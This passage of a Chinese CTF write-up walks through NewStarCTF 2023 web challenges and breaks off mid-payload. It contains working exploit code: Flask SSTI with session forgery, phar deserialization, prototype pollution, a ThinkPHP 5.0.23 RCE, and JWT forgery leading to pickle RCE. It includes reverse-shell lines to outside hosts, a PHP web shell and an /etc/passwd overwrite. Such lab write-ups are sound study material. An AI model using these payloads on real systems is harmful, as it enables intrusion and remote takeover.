f\"{str(os.listdir('./static/img/'))} &lt;br&gt; &lt;a href=\\\"/cancanneed?file=1.jpg\\\"&gt;/cancanneed?file=1.jpg&lt;/a&gt;\" @app.route(\"/download\", methods=[\"GET\"]) def download(): filename = request.args.get('file', '') if filename: filename = filename.replace('../', '') filename = os.path.join('static/img/', filename) print(filename) if (os.path.exists(filename)) and (\"start\" not in filename): return send_file(filename) else: abort(500) else: abort(404) @app.route('/backdoor', methods=[\"GET\"]) def backdoor(): try: print(session.get(\"user\")) if session.get(\"user\") is None: session['user'] = \"guest\" name = session.get(\"user\") if re.findall( r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\\+|request|cat|tac|base64|nl|hex|\\\\u|\\\\x|\\.', name): abort(500) else: return render_template_string( '竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁' % name) except Exception: abort(500) @app.errorhandler(404) def page_not_find(e): return render_template('404.html'), 404 @app.errorhandler(500) def internal_server_error(e): return render_template('500.html'), 500 if __name__ == '__main__': app.run('0.0.0.0', port=8080) @app.route('/backdoor', methods=[\"GET\"]) def backdoor(): try: print(session.get(\"user\")) if session.get(\"user\") is None: session['user'] = \"guest\" name = session.get(\"user\") if re.findall( r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\\+|request|cat|tac|base64|nl|hex|\\\\u|\\\\x|\\.', name): abort(500) else: return render_template_string( '竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁' % name) 重点就是backdoor方法了，这里很明显就是ssti注入了，不过在此之前我们需要伪造session.user才可。这里也是看了wp才知道读取key的路径：?file=....//....//....//....//....//app/config.py–这里也是服了，官方给的路径是错的，幸亏我猜出来了。。。 secret_key = \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\" 我们直接用工具加密解密即可： session为：eyJ1c2VyIjoiZ3Vlc3QifQ.ZUpCog.NWnPbXDYRZQLpWa_xO2dwRwnxmY key为：y0u_n3ver_k0nw_s3cret_key_1s_newst4r python3 flask_session_cookie_manager3.py decode -s \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\" -c \"eyJ1c2VyIjoiZ3Vlc3QifQ.ZUpCog.NWnPbXDYRZQLpWa_xO2dwRwnxmY\" 这里也是遇到个坑，不知为何，-s 和 -c都必须双引号包围，单引号包围一直报错，不清楚为何。。。 ![image-20231107220643922](NewStarCTF 2023/image-20231107220643922.png) 如图成功看到解密结果，接下来就是加密了，不过在此之前应该想好如何pass ssti，看上述代码发现关键词过滤了很多，并且编码呢也过滤了base64，unicode。十六进制。那我们八进制绕过即可，思路清晰了，但是手工的话太费劲，一看官方wp，又是脚本┭┮﹏┭┮。唉，还是得艰难的啃一啃： import re #正则表达式匹配 import requests import subprocess #用于执行外部命令 # 把这个下载了，需要使用里面的flask-session-cookie-manager3.py # https://github.com/noraj/flask-session-cookie-manager def string_to_octal_ascii(s): octal_ascii = \"\" for char in s: char_code = ord(char) #转换为ASCII码 #03o 参数告诉 format 函数将 char_code 转换为八进制，然后确保至少占3位宽，不足的地方用零填充。 #这里四个反斜杠是为了转义最终成功两个反斜杠, octal_ascii += \"\\\\\\\\\" + format(char_code, '03o') # octal_ascii += \"\\\\\\\\\" + format(char_code, 'o') #print(octal_ascii) return octal_ascii secret_key = \"y0u_n3ver_k0nw_s3cret_key_1s_newst4r\" # payload = \"{%print(7*7)%}\" # payload = \"{%print(\\\"\\\"\\\\\\\\u005f\\\\\\\\u005f\\\"\\\")%}\" # payload = \"{%print(\\\"\\\"\\\\\\\\x5f\\\\\\\\x5f\\\"\\\")%}\" eval_shell = \"\\\"\\\"\" + string_to_octal_ascii(\"__import__(\\\"os\\\").popen(\\\"cat /*\\\").read()\") + \"\\\"\\\"\" print(eval_shell) # docker部署&amp;windows运行payload # {{x.__init__.__globals__.__builtins__.eval('__import__(\"os\").popen(\"dir\").read()')}} payload = \"{{%print(xxx|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\151\\\\\\\\156\\\\\\\\151\\\\\\\\164\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\154\\\\\\\\157\\\\\\\\142\\\\\\\\141\\\\\\\\154\\\\\\\\163\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\\"\\\")(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\142\\\\\\\\165\\\\\\\\151\\\\\\\\154\\\\\\\\164\\\\\\\\151\\\\\\\\156\\\\\\\\163\\\\\\\\137\\\\\\\\137\\\"\\\")|attr(\\\"\\\"\\\\\\\\137\\\\\\\\137\\\\\\\\147\\\\\\\\145\\\\\\\\164\\\\\\\\151\\\\\\\\164\\\\\\\\145\\\\\\\\155\\\\\\\\137\\\\\\\\137\\\"\\\")(\\\"\\\"\\\\\\\\145\\\\\\\\166\\\\\\\\141\\\\\\\\154\\\"\\\")({0}))%}}\".format(eval_shell) #print(payload) command = \"python3 flask_session_cookie_manager3.py encode -s \\\"{0}\\\" -t \\\"{{'user':'{1}'}}\\\"\".format(secret_key, payload) print(command) session_data = subprocess.check_output(command, shell=True) #通过操作系统的shell执行指定命令,这里呢就是session伪造了 print(session_data) # linux和windows换行不一样，linux是去掉最后一个，windows是最后两个。 # 这里是由于上述subprocess函数是以字节流返回结果的,那如果其中有换行符的话,我们就需要去掉了 session_data = session_data[:-2].decode('utf-8')# 将字节流结果以utf-8编码的方式解码 # session_data = session_data[:-1].decode('utf-8') print(session_data) url = \"http://5c5893f4-8c26-4236-9534-e1da7bebc239.node4.buuoj.cn:81/backdoor\" cookies = {\"session\": session_data} res = requests.get(url=url, cookies=cookies) # print(res.text) pattern = r'&lt;h1&gt;(.*)&lt;/h1&gt;' result_content = re.search(pattern, res.text, re.S) # print(result_content) if result_content: result = result_content.group(1) print(result) else: print(\"something wrong!\") ![image-20231107221951803](NewStarCTF 2023/image-20231107221951803.png) 成功拿到flag，接下来就是看懂脚本并尝试编写了。。。。 WEEK4|WEB-PharOne ![image-20231108205750064](NewStarCTF 2023/image-20231108205750064.png) 访问首页看到是文件上传的页面，先习惯性的看一下源代码 ![image-20231108205812922](NewStarCTF 2023/image-20231108205812922.png) 发现可以访问class.php &lt;?php highlight_file(__FILE__); class Flag{ public $cmd; public function __destruct() { @exec($this-&gt;cmd); } } @unlink($_POST['file']); 里面内容如下，我们发现这里似乎是要进行反序列化的，但出人意料的是没有unserialize函数，但却有一个unlink函数，这里肯定是漏洞点了。但我们不清楚原理的，于是我结合题意进行关键词的搜索：phar unlink 文件上传之后发现这道题就是phar反序列化，学了一波之后来尝试一下。 直接上pop： &lt;?php //ini_set(\"phar.readonly\", 0); class Flag{ public $cmd; } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER();?&gt;\"); //设置stub $o = new Flag(); $o-&gt;cmd = 'bash -c \"bash -i &gt;&amp; /dev/tcp/vps-ip/5555 0&gt;&amp;1\"'; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 这里我直接运行之后将phar的后缀改为gif：因为猜测题目肯定会过滤phar关键字，但没过滤也是没关系的，一番万一嘛，随后上传phar.gif之后发现如下 ![image-20231108214428320](NewStarCTF 2023/image-20231108214428320.png) tm把__HALT_COMPILER也过滤了。。。没办法，肯定要继续绕过，随后继续关键字搜索，发现需要gzip压缩来绕过，但这里我不知道咋用gzip命令。。。于是看了一眼wp（狗头，啊！原来是system(\"gzip phar.phar\");即可，搜嘎 不过这里我是在phpstorm上运行的，故此gzip命令还得安装一下，mad就这玩意儿又废了我很长时间，安装可参考： https://blog.csdn.net/yuxisanno139/article/details/83016520 最后安装完，在配置好环境变量就能用 ![image-20231108220844914](NewStarCTF 2023/image-20231108220844914.png) 虽然运行完这里还会提示错误，但似乎可以忽略，因为文件还是可以正常生成的。最终payload如下 &lt;?php //ini_set(\"phar.readonly\", 0); class Flag{ public $cmd; } @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\"); //设置stub $o = new Flag(); $o-&gt;cmd = 'bash -c \"bash -i &gt;&amp; /dev/tcp/vps-ip/5555 0&gt;&amp;1\"'; $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); system(\"gzip phar.phar\"); rename(\"phar.phar.gz\", \"2.jpg\"); ?&gt; 这里重命名是因为后缀的限制，这也是测试出来的，虽然phar反序列化之前了解过，但从这次做题我感觉出来还是很垃圾，因此之后会在开一篇文章学习一下。 这里采用bash命令反弹是因为题目的命令函数是exec，结果不回显，因此需要反弹一下，如下图得到flag ![image-20231108220534992](NewStarCTF 2023/image-20231108220534992.png) 最后得到的2.jpg上传后根据上传目录，用phar协议读取（开启反序列化）一下就可反弹成功了，参考文章在下面 file=phar://upload/156005c5baf40ff51a327f1c34f2975b.jpg WEEK4|WEB-OtenkiBoy 这道题目就是week3的升级版了，依旧是在给的附件中审计代码 看到routes/submit.js ![image-20231108222639307](NewStarCTF 2023/image-20231108222639307.png) 看到这里可以，追踪一下mergejson函数，进入到routes/_components/utils.js const mergeJSON = function (target, patch, deep = false) { if (typeof patch !== \"object\") return patch;// 判断patch是否是对象 //如果 patch 是数组，直接返回 patch。这是因为数组在 JavaScript 中也被视为对象，但在合并时不需要递归处理。 if (Array.isArray(patch)) return patch; // do not recurse into arrays if (!target) target = {}// 判断target是否为空 //如果设置了深度合并 (deep === true)，则分别对 target 和 patch 进行深拷贝。 if (deep) { target = copyJSON(target), patch = copyJSON(patch); } //循环遍历 patch 中的每个属性。 for (let key in patch) { if (key === \"__proto__\") continue;// 过滤了__proto__关键词 //如果 target 和 patch 中的相应属性值不相等，递归调用 mergeJSON 来合并它们。 if (target[key] !== patch[key]) target[key] = mergeJSON(target[key], patch[key]); } return target; } 但这里过滤了__proto__，我们可以使用constructor.prototype去代替__proto__进行原型链污染 接下来是寻找注入点，查看routes/info.js async function getInfo(timestamp) { //检查传入的timestamp时间戳是否为数字，否则赋值为当前时间戳 timestamp = typeof timestamp === \"number\" ? timestamp : Date.now(); // Remove test data from before the movie was released let minTimestamp; try { //获取min_public的时间戳 minTimestamp = createDate(CONFIG.min_public_time).getTime(); //检查 minTimestamp 是否为安全整数（Number.isSafeInteger），如果不是，则抛出错误。 if (!Number.isSafeInteger(minTimestamp)) throw new Error(\"Invalid configuration min_public_time.\"); } catch (e) { console.warn(`\\x1b[33m${e.message}\\x1b[0m`); //尝试使用默认值 DEFAULT_CONFIG.min_public_time 重新计算 minTimestamp。 console.warn(`Try using default value ${DEFAULT_CONFIG.min_public_time}.`); minTimestamp = createDate(DEFAULT_CONFIG.min_public_time, { UTC: false, baseDate: LauchTime }).getTime(); } //将 timestamp 更新为传入的 timestamp 和 minTimestamp 中较大的一个。这确保了 timestamp 至少是 minTimestamp。 timestamp = Math.max(timestamp, minTimestamp); //从名为 wishes 的表中选择满足条件 timestamp &gt;= ? 的所有数据，其中 ? 由传入的 timestamp 决定。 const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`, [timestamp]).catch(e =&gt; { throw e }); return data; } minTimestamp取自配置文件，在Math.max处为可控的timestamp设置下限值，我们需要将minTimestamp改小来获取更早的数据库数据 追踪createDate，在routes/_components/utils.js中 存在几个注入点 opts 注入点 const DEFAULT_CREATE_DATE_OPTIONS = { UTC: false, format: [ \"yyyy-MM-dd HH:mm:ss\", \"yyyy-MM-dd HH:mm:ss.fff\", \"yyyy-MM-dd\", \"MM/dd/yyyy\", \"MM/dd/yyyy HH:mm:ss\", \"MM/dd/yyyy HH:mm:ss.fff\", \"MM/dd/yy HH:mm:ss\", \"HH:mm:ss\", \"HH:mm:ss.fff\" ], // baseDate: undefined } //通过调用 copyJSON 函数复制了一个默认的日期配置对象 const CopiedDefaultOptions = copyJSON(DEFAULT_CREATE_DATE_OPTIONS) if (typeof opts === \"undefined\") opts = CopiedDefaultOptions//如果未提供配置项 opts，则将其设为默认配置的副本。 //如果提供了 opts 但不是对象，则将其转换为对象，同时设置 UTC 属性为 opts 的布尔值。 if (typeof opts !== \"object\") opts = { ...CopiedDefaultOptions, UTC: Boolean(opts) }; opts.UTC = typeof opts.UTC === \"undefined\" ? CopiedDefaultOptions.UTC : Boolean(opts.UTC); opts.format = opts.format || CopiedDefaultOptions.format; if (!Array.isArray(opts.format)) opts.format = [opts.format]//如果格式不是数组，将其转换为数组。 //通过 filter 函数，保留 opts.format 中类型为字符串的项，过滤掉非字符串类型的项，确保了数组中只包含字符串类型的日期格式。 opts.format = opts.format.filter(f =&gt; typeof f === \"string\") .filter(f =&gt; { // 判断f是否包含有效的日期格式符号（也就是要包含下列符号的至少一个） if (/yy|yyyy|MM|dd|HH|mm|ss|fff/.test(f) === false) { console.warn(`Invalid format \"${f}\".`, `At least one format specifier is required.`); return false; } //通过替换操作将 yyyy 转换为 yy，然后使用正则表达式分割字符串，检查各个日期格式符号之间是否存在分隔符。 if (`|${f}|`.replace(/yyyy/g, \"yy\").split(/yy|MM|dd|HH|mm|ss|fff/).includes(\"\")) { console.warn(`Invalid format \"${f}\".`, `Delimeters are required between format specifiers.`); return false; } //如果日期格式中同时包含 yyyy 和 yy，输出警告信息 if (f.includes(\"yyyy\") &amp;&amp; f.replace(/yyyy/g, \"\").includes(\"yy\")) { console.warn(`Invalid format \"${f}\".`, `\"yyyy\" and \"yy\" cannot be used together.`); return false; } return true; }) //如果未提供基准日期 (opts.baseDate)，则将其设置为当前时间戳。这一步确保了在创建日期对象时有一个合适的基准日期。 opts.baseDate = new Date(opts.baseDate || Date.now()); 当createDate的opts未指定时并不能注入，但是当opts为 JSON 对象且没有指定format属性时，下面这一行会触发原型链 opts.format = opts.format || CopiedDefaultOptions.format; 而对于baseDate，由于DEFAULT_CREATE_DATE_OPTIONS中本身不含baseDate，可直接触发该原型链 opts.baseDate = new Date(opts.baseDate || Date.now()); 这里经过GPT与wp的喂养，似乎懂了那么一丢丢。。。。 时间函数注入点 在utility functions的注释部分存在函数 const getHMS = (time) =&gt; { //使用正则表达式对输入的 time 进行匹配。该正则表达式用于匹配时间字符串，支持时、分、秒和毫秒的提取。 let regres = /^(\\d+) *\\: *(\\d+)( *\\: *(\\d+)( *\\. *(\\d+))?)?$/.exec(time.trim()) if (regres === null) return {} //使用解构赋值和 map 函数提取正则匹配结果中的数字部分，并将其转换为数字类型。如果某个数字未定义，将其设置为 undefined。 let [n1, n2, n3, n4] = [regres[1], regres[2], regres[4], regres[6]].map(t =&gt; typeof t === \"undefined\" ? undefined : Number(t)); if (typeof n3 === \"undefined\") n3 = 0; // 23:59(:59)? if (0 &lt;= n1 &amp;&amp; n1 &lt;= 23 &amp;&amp; 0 &lt;= n2 &amp;&amp; n2 &lt;= 59 &amp;&amp; 0 &lt;= n3 &amp;&amp; n3 &lt;= 59) { // 23:59:59(.999)? //使用 pad 函数将时、分、秒格式化为两位数。 let HH = pad(n1, 2), mm = pad(n2, 2), ss = pad(n3, 2), //如果毫秒部分存在，将其格式化并添加到结果对象中。 fff = typeof n4 === \"undefined\" ? undefined : pad(n4, 3).substring(0, 3); const o = { HH, mm, ss } //返回一个包含时、分、秒（和可能的毫秒）信息的对象。 if (typeof fff !== \"undefined\") o.fff = fff; return o; } else return {} } 当传入的传入time中不包含毫秒时，返回的对象中不会带有fff属性 调用getHMS函数的地方在createDate的末尾几行，属于createDate的 Fallback Auto Detection 部分 const { HH, mm, ss, fff } = getHMS(time_str) 当time_str中不包含毫秒，能够触发原型链 接下来就是如何利用漏洞的问题了 我们发现createDate的opts的format支持yy标识符，而当年份小于100时，我们认为是20世纪的年份，如下图 ![image-20231110174102902](NewStarCTF 2023/image-20231110174102902.png) 举例来说，如果format为20yy-MM-dd，在format解析字符串2023-10-01时，将解析yy为23，输出为1923，最终输出的年份是1923-10-01 **目标：**污染format 前面提到，污染format的条件是opts为 JSON 对象且没有指定format属性，观察routes/info中的相应片段，我们需要触发下面的catch try { minTimestamp = createDate(CONFIG.min_public_time).getTime(); if (!Number.isSafeInteger(minTimestamp)) throw new Error(\"Invalid configuration min_public_time.\"); } catch (e) { console.warn(`\\x1b[33m${e.message}\\x1b[0m`); console.warn(`Try using default value ${DEFAULT_CONFIG.min_public_time}.`); minTimestamp = createDate(DEFAULT_CONFIG.min_public_time, { UTC: false, baseDate: LauchTime }).getTime(); } 触发catch的条件是前面try的createDate返回一个无效的日期，或者createDate本身被调用时法神错误 **目标：**触发createDate错误，或使createDate返回无效日期 需要利用刚才剩余的两个注入点 下面的这行代码表明了基于format的日期匹配不可能返回一个无效日期，因此返回无效日期只有 Fallback Auto Detection 能够做到 if (Number.isSafeInteger(d.getTime())) return d; else continue; 从如下代码片段可知，基于format的日期匹配依赖于baseDate，format 的过程是在argTable上进行覆盖 const dateObj = opts.baseDate const _UTC = opts.UTC ? \"UTC\" : \"\" let argTable = { \"yyyy\": dateObj[`get${_UTC}FullYear`](), \"MM\": dateObj[`get${_UTC}Month`]() + 1, \"dd\": dateObj[`get${_UTC}Date`](), \"HH\": dateObj[`get${_UTC}Hours`](), \"mm\": dateObj[`get${_UTC}Minutes`](), \"ss\": dateObj[`get${_UTC}Seconds`](), \"fff\": dateObj[`get${_UTC}Milliseconds`] ? dateObj[`get${_UTC}Milliseconds`]() : undefined // due to system architecture } sortTable.forEach((f, i) =&gt; { if (f == \"yy\") { let year = Number(regres[i + 1]) year = year &lt; 100 ? (1900 + year) : year; return argTable[\"yyyy\"] = year; } argTable[f] = Number(regres[i + 1]) }) 因此污染baseDate为无效日期即可绕过 format 模式进入 Fallback Auto Detection routes/info.js的try中用的是config.js中的min_pulic_time，为2019-07-09 00:00:00，不带有毫秒，刚好能够触发fff的原型链污染，为fff指定为无效值即可 到此为止，使用如下的 payload 可以触发catch { \"contact\":\"1\", \"reason\":\"2\", \"constructor\":{ \"prototype\":{ \"baseDate\":\"aaa\", \"fff\": \"bbb\" } } } 进入catch后，达到了污染format的条件，但是createDate的参数变成了config.default.js中的min_public_time，为2019-07-08T16:00:00.000Z，因此可以构造format为yy19-MM-ddTHH:mm:ss.fffZ 然后基于format的日期匹配会返回1920-07-08T16:00:00.000Z的日期，已经将minTimestamp提早了近一个世纪了 因此最终的payload为 { \"contact\":\"a\", \"reason\":\"a\", \"constructor\":{ \"prototype\":{ \"format\": \"yy19-MM-ddTHH:mm:ss.fffZ\", \"baseDate\":\"aaa\", \"fff\": \"bbb\" } } } 以Content-Type: application/json的 Header 用POST方法向路径/submit请求即可 然后为我们再请求/info/0，找到含有 flag 的一条数据 ![image-20231110180027322](NewStarCTF 2023/image-20231110180027322.png) 拿到flag WEEK5|WEB-Unserialize Again ![image-20231110203212897](NewStarCTF 2023/image-20231110203212897.png) 访问首页是文件上传，直接上传一个发现提示我们，这里不是上传点，那右键看一下源代码，发现cookie中藏有一个php文件，我们直接访问看到phar反序列化代码 &lt;?php highlight_file(__FILE__); error_reporting(0); class story{ private $user='admin'; public $pass; public $eating; public $God='false'; public function __wakeup(){ $this-&gt;user='human'; if(1==1){ die(); } if(1!=1){ echo $fffflag; } } public function __construct(){ $this-&gt;user='AshenOne'; $this-&gt;eating='fire'; die(); } public function __tostring(){ return $this-&gt;user.$this-&gt;pass; } public function __invoke(){ if($this-&gt;user=='admin'&amp;&amp;$this-&gt;pass=='admin'){ echo $nothing; } } public function __destruct(){ if($this-&gt;God=='true'&amp;&amp;$this-&gt;user=='admin'){ system($this-&gt;eating); } else{ die('Get Out!'); } } } if(isset($_GET['pear'])&amp;&amp;isset($_GET['apple'])){ // $Eden=new story(); $pear=$_GET['pear']; $Adam=$_GET['apple']; $file=file_get_contents('php://input'); file_put_contents($pear,urldecode($file)); file_exists($Adam); } else{ echo '多吃雪梨'; } 多吃雪梨 这道题分析下来也很简单，就是直接顺势进入destruct魔术方法即可，至于wakeup的绕过就很简单了 ![image-20231110204546036](NewStarCTF 2023/image-20231110204546036.png) 这里也看到PHP是7.0.9，可以绕过wakeup的，就在我纳闷儿construct咋绕过时，看了一篇文章懵逼了，反序列化不触发。。。。 我去，我竟然不知道。。。那我们直接写phar即可 &lt;?php //ini_set(\"phar.readonly\", 0); class story{ public $eating = 'cat /f*'; public $God='true'; } //@unlink(\"phar.phar\"); $phar = new Phar(\"1.phar\"); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\"); //设置stub $o = new story(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering(); ?&gt; 修改完之后，因为phar的最后有一段signature，是phar的签名，放在文件末尾，要注意因为我们修改了文件的内容（也就是绕过wake时修改的属性个数），之前的签名就会无效，所以需要更换一个新的签名，生成新签名的脚本如下 from hashlib import sha1 with open('1.phar', 'rb') as file:&nbsp;&nbsp;&nbsp; f = file.read() s = f[:-28] # 获取要签名的数据 h = f[-8:] # 获取签名类型和GBMB标识 newf = s + sha1(s).digest() + h # 数据 + 签名 + (类型 + GBMB) with open('newtest.phar', 'wb') as file:&nbsp;&nbsp;&nbsp; file.write(newf) # 写入新文件 最后读取 newtest.phar 的内容进行url编码post传上去，get传 ?pear=1.phar&amp;apple=phar://1.phar 即可 ![image-20231110205835163](NewStarCTF 2023/image-20231110205835163.png) 如图此处修改改变2的值 %3C%3Fphp%20__HALT_COMPILER%28%29%3B%20%3F%3E%0D%0Av%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%40%00%00%00O%3A5%3A%22story%22%3A3%3A%7Bs%3A6%3A%22eating%22%3Bs%3A7%3A%22cat%20/f%2A%22%3Bs%3A3%3A%22God%22%3Bs%3A4%3A%22true%22%3B%7D%08%00%00%00test.txt%04%00%00%00%E7%28Ne%04%00%00%00%0C~%7F%D8%B6%01%00%00%00%00%00%00test%F3nV%C6%07%A7%D9%96%86%CC%1A%95%19%CE3%DA%DC%0A%21-%02%00%00%00GBMB ![image-20231110210513035](NewStarCTF 2023/image-20231110210513035.png) 拿到flag WEEK5|WEB-Final 这里访问首页发现是thinkphp框架，那我们首先需要了解其版本，直接url后面拼接任意字符，使其报错而泄露版本信息 ![image-20231111090429701](NewStarCTF 2023/image-20231111090429701.png) 如上图为5.0.23-对应的是远程代码执行漏洞，直接上通用payload： /index.php?s=captcha POST: _method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=5 如下图，发现system被禁用了，此时我们可以选择反弹shell，函数呢选择exec即可 ![image-20231111085326347](NewStarCTF 2023/image-20231111085326347.png) bash -i &gt;&amp; /dev/tcp/192.168.1.12/1234 0&gt;&amp;1 _method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo '&lt;?php eval($_POST['cmd']);?&gt;' &gt; /var/www/public/1.php 这里用的是官方wp的payload，不知为何这里反弹shell似乎不成功，于是采用了exec写入文件的方式来执行。 如上述执行成功后，蚁剑连接，进入终端后显示无权限读取 ![image-20231111093346977](NewStarCTF 2023/image-20231111093346977.png) 这里也是看wp发现用suid提权（之前也没了解过。。。。 那我们先查看具有suid权限的命令，这里不知为何输入命令没有回显，随后想到将命令结果写入文件中来读取 find&nbsp;/&nbsp;-user&nbsp;root&nbsp;-perm&nbsp;-4000&nbsp;-print&nbsp;2&gt;/dev/null &gt; 1.txt 之后cat 1.txt看到相关命令 ![image-20231111093527982](NewStarCTF 2023/image-20231111093527982.png) 那我们直接用cp覆盖即可 cp /flag_dd3f6380aa0d /etc/passwd ![image-20231111092542066](NewStarCTF 2023/image-20231111092542066.png) 拿到flag WEEK5|WEB-Ye’s Pickle ![image-20231111122457883](NewStarCTF 2023/image-20231111122457883.png) 进入首页给我们展示了token，看着有一部分像base64，那我们解密一下看看 ![image-20231111122534595](NewStarCTF 2023/image-20231111122534595.png) 解密发现含有jwt，那就有可能需要进行jwt伪造。接下来审计一下题目给的附件 # -*- coding: utf-8 -*- import base64 import string import random from flask import * import jwcrypto.jwk as jwk import pickle from python_jwt import * app = Flask(__name__) def generate_random_string(length=16): characters = string.ascii_letters + string.digits # 包含字母和数字 random_string = ''.join(random.choice(characters) for _ in range(length)) return random_string app.config['SECRET_KEY'] = generate_random_string(16) key = jwk.JWK.generate(kty='RSA', size=2048) @app.route(\"/\") def index(): payload=request.args.get(\"token\") if payload: token=verify_jwt(payload, key, ['PS256']) session[\"role\"]=token[1]['role'] return render_template('index.html') else: session[\"role\"]=\"guest\" user={\"username\":\"boogipop\",\"role\":\"guest\"} jwt = generate_jwt(user, key, 'PS256', timedelta(minutes=60)) return render_template('index.html',token=jwt) @app.route(\"/pickle\") def unser(): if session[\"role\"]==\"admin\": pickle.loads(base64.b64decode(request.args.get(\"pickle\"))) return render_template(\"index.html\") else: return render_template(\"index.html\") if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=5000, debug=True) 第一个函数主要是生成了一个随机字符串，用于Flask应用程序密钥的随机字符串。接着使用 jwcrypto.jwk 库生成了一个RSA密钥 (key)。 然后/路由对应的方法，首先是接受一个token的传参，随后如果payload存在，就使用verify_jwt进行jwt的验证，如果成功，则将role赋值为admin。接下来看pickle路由，对应的是pickle反序列化，这里如果role对应的值为admin，则对传入的pickle参数进行pickle反序列化处理。 那思路清晰了，我们就是要想办法进行jwt的伪造，使得role的值为admin，从而进行pickle发序列化进行RCE（这里由于我也没学过，就直接看wp了） exp如下： from datetime import timedelta import base64 from json import loads, dumps from jwcrypto.common import base64url_decode, base64url_encode def topic(topic): \"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\" [header, payload, signature] = topic.split('.') parsed_payload = loads(base64url_decode(payload)) parsed_payload['role'] = \"admin\" #parsed_payload['exp'] = 2000000000 fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':')))) return '{\" ' + header + '.' + fake_payload + '.\":\"\",\"protected\":\"' + header + '\", \"payload\":\"' + payload + '\",\"signature\":\"' + signature + '\"}' token = topic('eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTk2Nzk1OTYsImlhdCI6MTY5OTY3NTk5NiwianRpIjoiNWtZbXdDdTJkOXpBcFQ2N0l4a0kydyIsIm5iZiI6MTY5OTY3NTk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.35mISFjtHpWWuJ6BMQsUQCrZ5iLMGvUSIeu3S7uNsPp_b-VnH9VmFFrZFf41xRQOG0hXFE1nQUWU_gEjbVsC7vTB0U6Ia9joAYgmgLAom2-i7hFsaLzJItLGtgHhz-HmcKerJ5QCvQeqXdSsmhRESXdg3NHQ-lHS9-2go2BXOtJjSy-MwKrOZJ2KAAMWMCR_P-CRIaZ0s7dLX1oeAfS7V5gRh-_tJGejQ_U7-jyqOa1mgDIIgczZYIfY-1Su34GhT7kWUUNulFkqSDy6OjARtC1ZhGOHKVd50ITnsDnT_NSzXARmZuMKEe5_2_k2E_-l2Pm4aIAQeSpx7oY5ueUGxQ') print(token) p=b\"(cos system S'bash -c \\\"bash -i &gt;&amp; /dev/tcp/vps-ip/5555 0&gt;&amp;1\\\"' o\" payload=base64.b64encode(p) print(payload) 可参考：https://exp10it.cn/2022/10/2022-祥云杯-web-writeup/#funweb复现 随机对生成的jwt在/路由下赋值给token传入（记得进行url编码） {\" eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTk2Nzk1OTYsImlhdCI6MTY5OTY3NTk5NiwianRpIjoiNWtZbXdDdTJkOXpBcFQ2N0l4a0kydyIsIm5iZiI6MTY5OTY3NTk5Niwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.\":\"\",\"protected\":\"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9\", 